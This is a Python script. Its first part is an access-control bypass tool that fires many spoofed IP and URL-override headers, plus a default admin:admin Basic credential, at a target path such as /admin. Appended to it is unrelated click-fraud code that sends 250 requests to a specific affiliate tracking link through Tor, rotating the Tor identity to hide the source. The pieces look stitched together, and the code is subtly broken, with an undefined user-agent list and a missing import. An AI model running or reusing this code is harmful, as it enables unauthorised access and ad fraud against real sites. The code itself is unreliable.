import requests
from sys import exit, argv
from colorama import Fore, Back, Style, init
from stem import Signal
from stem.control import Controller
import random

init()

print("""
    __                   __ __           _____
   / /_  __  __   ____  / // / _________|__  /_____
  / __ \/ / / /  / __ \/ // /_/ ___/ ___//_ </ ___/
 / /_/ / /_/ /  / /_/ /__  __(__  |__  )__/ / /
/_.___/\__, /  / .___/  /_/ /____/____/____/_/
      /____/  /_/

       version: 1.0
       coded by (twitter: @Salahboij) 
""")

print(Fore.GREEN, "\rIF BYPASSED ACCORDING TO THE ANALYSIS => GREEN")
print(Fore.YELLOW, "\rIF REDIRECT => YELLOW ")
print(Fore.LIGHTRED_EX, "\rIF DIDN'T BYPASS => RED\n ")


def getArgs():
    try:
        URL = argv[1]
        PATH = argv[2]
        return URL, PATH
    except:
        print("\n\nPlease use this format  => ./byp4ss3er http(s)://url /path \n")
        print("Example  => ./byp4ss3er http(s)://somewebsite.com /admin \n\n")
    exit()  # kill the program


def fixedHeaders(URL, PATH):
    payloads = {
        'X-Original-URL': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'Client-IP': '127.0.0.1',
        'Proxy-Host': '127.0.0.1',
        'X-Forwarded': '127.0.0.1',
        'X-Forwarded-By': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Forwarded-For-Original': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-Forwarded-Server': '127.0.0.1',
        'X-Forwarder-For': '127.0.0.1',
        'X-Forward-For': '127.0.0.1',
        'Referer': URL + PATH,
        'Referrer': URL + PATH,
        'X-Host': '127.0.0.1',
        'X-Original-Remote-Addr': '127.0.0.1',
        'X-Proxy-Url': '127.0.0.1',
        'X-Forwarded-Proto': '127.0.0.1',
        'X-Real-Ip': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Custom-IP-Authorization': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Forwarding-Addr': '127.0.0.1',
        'X-Http-Host-Override': '127.0.0.1',
        'X-Original-Remote-Addr': '127.0.0.1',
        'X-Original-Url': '127.0.0.1',
        'X-Proxy-Url': '127.0.0.1',
        'X-Rewrite-Url': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Forward-IP': '127.0.0.1',
        'X-Forwarded': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Forwarded-For-Original': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-Forwarded-Server': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Originating-URL': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-Proxy-Host': '127.0.0.1',
        'X-Rewrite-URL': '127.0.0.1',
        'X-Original-URL': '127.0.0.1',
        'X-Request-URL': '127.0.0.1',
        'X-Wap-Profile': '127.0.0.1',
        'X-UIDH': '127.0.0.1',
        'X-URI': '127.0.0.1',
        'X-Original-URL': '127.0.0.1',
        'X-Forwarded-Proto': '127.0.0.1',
        'X-Https': 'on',
        'X-HTTP-Host-Override': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Original-URL': '127.0.0.1',
        'X-Rewrite-URL': '127.0.0.1',
        'X-Originating-URL': '127.0.0.1',
        'X-Forwarded-Path': '127.0.0.1',
        'X-Custom-IP-Authorization': '127.0.0.1',
        'X-Routing': '127.0.0.1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4505.0 Safari/537.36',
        'Cookie': 'cookie',
        'Authorization': 'Basic YWRtaW46YWRtaW4=',
        'X-Override-URL': 'http://example.com/profile.xml',
    }

    return payloads


def dynamicHeaders(PATH):
    payloads = {
        'Referer': PATH,
        'Origin': 'http://127.0.0.1',
        'Host': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Rewrite-URL': '127.0.0.1',
        'X-Forwarded-Proto': 'https',
        'X-Forwarded-Host': '127.0.0.1',
        'X-Forwarded-Server': '127.0.0.1',
        'X-Forwarded-By': '127.0.0.1',
        'X-Forwarded-For-Original': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Forwarded': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Forwarded-For-Original': '127.0.0.1',
        'X-Forwarded-Server': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Forward-IP': '127.0.0.1',
        'X-Forwarded': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Forwarded-For-Original': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-Forwarded-Server': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Originating-URL': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-Proxy-Host': '127.0.0.1',
        'X-Rewrite-URL': '127.0.0.1',
        'X-Original-URL': '127.0.0.1',
        'X-Request-URL': '127.0.0.1',
        'X-Wap-Profile': '127.0.0.1',
        'X-UIDH': '127.0.0.1',
        'X-URI': '127.0.0.1',
        'X-Original-URL': '127.0.0.1',
        'X-Forwarded-Proto': '127.0.0.1',
        'X-Https': 'on',
        'X-HTTP-Host-Override': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Original-URL': '127.0.0.1',
        'X-Rewrite-URL': '127.0.0.1',
        'X-Originating-URL': '127.0.0.1',
        'X-Forwarded-Path': '127.0.0.1',
        'X-Custom-IP-Authorization': '127.0.0.1',
        'X-Routing': '127.0.0.1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4505.0 Safari/537.36',
        'Cookie': 'cookie',
        'Authorization': 'Basic YWRtaW46YWRtaW4=',
        'X-Override-URL': 'http://example.com/profile.xml',
    }

    return payloads


def bypass(URL, PATH):
    response = requests.get(URL + PATH, headers=fixedHeaders(URL, PATH))
    print("\n\n", Fore.RED, response.status_code, " FixedHeaders ")

    response = requests.get(URL + PATH, headers=dynamicHeaders(PATH))
    print("\n\n", Fore.RED, response.status_code, " DynamicHeaders ")


# Example usage
if __name__ == '__main__':
    URL, PATH = getArgs()
    bypass(URL, PATH)

def set_tor_proxy():
    proxies = {
        'http': 'socks5h://localhost:9050',
        'https': 'socks5h://localhost:9050'
    }
    return proxies

# Change Tor identity
def change_tor_identity():
    with Controller.from_port(port=9051) as controller:
        try:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        except stem.SocketError as e:
            print(f'Error changing Tor identity: {str(e)}')

def increase_link_click(url, num_clicks):
    for _ in range(num_clicks):
        headers = {
            'User-Agent': random.choice(USER_AGENTS)
        }
        
        proxies = set_tor_proxy()
        
        try:
            response = requests.get(url, headers=headers, proxies=proxies)
            if response.status_code == 200:
                print('Link clicked successfully.')
            else:
                print(f'Failed to click the link. Status code: {response.status_code}')
        except requests.exceptions.RequestException as e:
            print(f'Error: {str(e)}')

            # Change Tor identity
            change_tor_identity()

# Example usage
link = 'https://axisempirellc975.o18.click/c?o=20278697&m=3741&a=394570'  # Replace with the target URL
click_count = 250  # Replace with the desired number of clicks

increase_link_click(link, click_count)

